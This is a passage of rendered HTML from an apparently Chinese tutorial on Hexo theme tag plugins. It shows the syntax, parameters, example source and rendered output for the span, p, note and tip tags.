class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% span red, 红色 %&#125;、&#123;% span yellow, 黄色 %&#125;、&#123;% span green, 绿色 %&#125;、&#123;% span cyan, 青色 %&#125;、&#123;% span blue, 蓝色 %&#125;、&#123;% span gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% span center logo large, Volantis %&#125;</span><br><span class="line">&#123;% span center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<span class='p red'>红色</span>、<span class='p yellow'>黄色</span>、<span class='p green'>绿色</span>、<span class='p cyan'>青色</span>、<span class='p blue'>蓝色</span>、<span class='p gray'>灰色</span>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<br><span class='p center logo large'>Volantis</span><br><span class='p center small'>A Wonderful Theme for Hexo</span></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-3-段落文本-p">2.3 段落文本 p</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% p 样式参数(参数以空格划分), 文本内容 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>字体</code>: logo, code</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>大小</code>: small, h4, h3, h2, h1, large, huge, ultra</li><li><code>对齐方向</code>: left, center, right</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 彩色文字</span><br><span class="line">在一段话中方便插入各种颜色的标签，包括：&#123;% p red, 红色 %&#125;、&#123;% p yellow, 黄色 %&#125;、&#123;% p green, 绿色 %&#125;、&#123;% p cyan, 青色 %&#125;、&#123;% p blue, 蓝色 %&#125;、&#123;% p gray, 灰色 %&#125;。</span><br><span class="line"><span class="bullet">-</span> 超大号文字</span><br><span class="line">文档「开始」页面中的标题部分就是超大号文字。</span><br><span class="line">&#123;% p center logo large, Volantis %&#125;</span><br><span class="line">&#123;% p center small, A Wonderful Theme for Hexo %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><ul><li>彩色文字<br>在一段话中方便插入各种颜色的标签，包括：<p class='p red'>红色</p>、<p class='p yellow'>黄色</p>、<p class='p green'>绿色</p>、<p class='p cyan'>青色</p>、<p class='p blue'>蓝色</p>、<p class='p gray'>灰色</p>。</li><li>超大号文字<br>文档「开始」页面中的标题部分就是超大号文字。<p class='p center logo large'>Volantis</p><p class='p center small'>A Wonderful Theme for Hexo</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-4-引用note">2.4 引用note</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">通用配置</button></li><li class="tab"><button type="button" data-href="#分栏-2">语法格式</button></li><li class="tab"><button type="button" data-href="#分栏-3">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-4">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-5">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: simple</span><br><span class="line">  icons: false</span><br><span class="line">  border<span class="emphasis">_radius: 3</span></span><br><span class="line"><span class="emphasis">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span></span><br><span class="line"><span class="emphasis">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span></span><br><span class="line"><span class="emphasis">  light_</span>bg<span class="emphasis">_offset: 0</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 自带icon</span></span><br><span class="line">&#123;% note [class] [no-icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"><span class="section"># 外部icon</span></span><br><span class="line">&#123;% note [color] [icon] [style] %&#125;</span><br><span class="line">Any content (support inline tags too.io).</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.自带icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / primary / success / info / warning / danger ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】不显示 icon</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><p>2.外部icon</p><table><thead><tr><th>参数</th><th style="text-align:center">用法</th></tr></thead><tbody><tr><td>class</td><td style="text-align:center">【可选】标识，不同的标识有不同的配色 （ default / blue / pink / red / purple / orange / green ）</td></tr><tr><td>no-icon</td><td style="text-align:center">【可选】可配置自定义 icon (只支持 fontawesome 图标, 也可以配置 no-icon )</td></tr><tr><td>style</td><td style="text-align:center">【可选】可以覆盖配置中的 style （simple/modern/flat/disabled）</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note simple %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default simple %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary simple %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success simple %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info simple %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning simple %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger simple %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note modern %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default modern %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary modern %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success modern %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info modern %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning modern %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger modern %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note flat %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default flat %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary flat %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success flat %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info flat %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning flat %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger flat %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note disabled %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default disabled %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary disabled %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success disabled %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info disabled %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning disabled %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger disabled %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;默认 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note default no-icon %&#125;default 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note primary no-icon %&#125;primary 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note success no-icon %&#125;success 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note info no-icon %&#125;info 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note warning no-icon %&#125;warning 提示块标签&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note danger no-icon %&#125;danger 提示块标签&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; simple %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; simple %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; simple%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; simple %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; simple %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; simple %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>2.<code>modern</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; modern %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; modern%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; modern %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; modern %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; modern %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>3.<code>flat</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; flat %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; flat %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; flat%&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; flat %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; flat %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; flat %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>4.<code>disabled</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note &#x27;fab fa-cc-visa&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue &#x27;fas fa-bullhorn&#x27; disabled %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink &#x27;fas fa-car-crash&#x27; disabled %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red &#x27;fas fa-fan&#x27; disabled %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange &#x27;fas fa-battery-half&#x27; disabled %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple &#x27;far fa-hand-scissors&#x27; disabled %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green &#x27;fab fa-internet-explorer&#x27; disabled %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure><p>5.<code>no-icon</code>样式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% note no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note blue no-icon %&#125;2021年快到了....&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note pink no-icon %&#125;小心开车 安全至上&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note red no-icon %&#125;这是三片呢？还是四片？&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note orange no-icon %&#125;你是刷 Visa 还是 UnionPay&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note purple no-icon %&#125;剪刀石头布&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% note green no-icon %&#125;前端最讨厌的浏览器&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-5"><details class="folding-tag" blue><summary> 1.自带icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note simple"><p>默认 提示块标签</p></div><div class="note default simple"><p>default 提示块标签</p></div><div class="note primary simple"><p>primary 提示块标签</p></div><div class="note success simple"><p>success 提示块标签</p></div><div class="note info simple"><p>info 提示块标签</p></div><div class="note warning simple"><p>warning 提示块标签</p></div><div class="note danger simple"><p>danger 提示块标签</p></div>2.`modern`样式<div class="note modern"><p>默认 提示块标签</p></div><div class="note default modern"><p>default 提示块标签</p></div><div class="note primary modern"><p>primary 提示块标签</p></div><div class="note success modern"><p>success 提示块标签</p></div><div class="note info modern"><p>info 提示块标签</p></div><div class="note warning modern"><p>warning 提示块标签</p></div><div class="note danger modern"><p>danger 提示块标签</p></div><p>3.<code>flat</code>样式</p><div class="note flat"><p>默认 提示块标签</p></div><div class="note default flat"><p>default 提示块标签</p></div><div class="note primary flat"><p>primary 提示块标签</p></div><div class="note success flat"><p>success 提示块标签</p></div><div class="note info flat"><p>info 提示块标签</p></div><div class="note warning flat"><p>warning 提示块标签</p></div><div class="note danger flat"><p>danger 提示块标签</p></div><p>4.<code>disabled</code>样式</p><div class="note disabled"><p>默认 提示块标签</p></div><div class="note default disabled"><p>default 提示块标签</p></div><div class="note primary disabled"><p>primary 提示块标签</p></div><div class="note success disabled"><p>success 提示块标签</p></div><div class="note info disabled"><p>info 提示块标签</p></div><div class="note warning disabled"><p>warning 提示块标签</p></div><div class="note danger disabled"><p>danger 提示块标签</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>默认 提示块标签</p></div><div class="note default no-icon flat"><p>default 提示块标签</p></div><div class="note primary no-icon flat"><p>primary 提示块标签</p></div><div class="note success no-icon flat"><p>success 提示块标签</p></div><div class="note info no-icon flat"><p>info 提示块标签</p></div><div class="note warning no-icon flat"><p>warning 提示块标签</p></div><div class="note danger no-icon flat"><p>danger 提示块标签</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.外部icon </summary>              <div class='content'>              <p>1.<code>simple</code>样式</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>2.<code>modern</code>样式</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>3.<code>flat</code>样式</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>4.<code>disabled</code>样式</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021年快到了…</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>小心开车 安全至上</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>这是三片呢？还是四片？</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>前端最讨厌的浏览器</p></div><p>5.<code>no-icon</code>样式</p><div class="note no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note blue no-icon flat"><p>2021年快到了…</p></div><div class="note pink no-icon flat"><p>小心开车 安全至上</p></div><div class="note red no-icon flat"><p>这是三片呢？还是四片？</p></div><div class="note orange no-icon flat"><p>你是刷 Visa 还是 UnionPay</p></div><div class="note purple no-icon flat"><p>剪刀石头布</p></div><div class="note green no-icon flat"><p>前端最讨厌的浏览器</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-上标标签-tip">2.5 上标标签 tip</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" 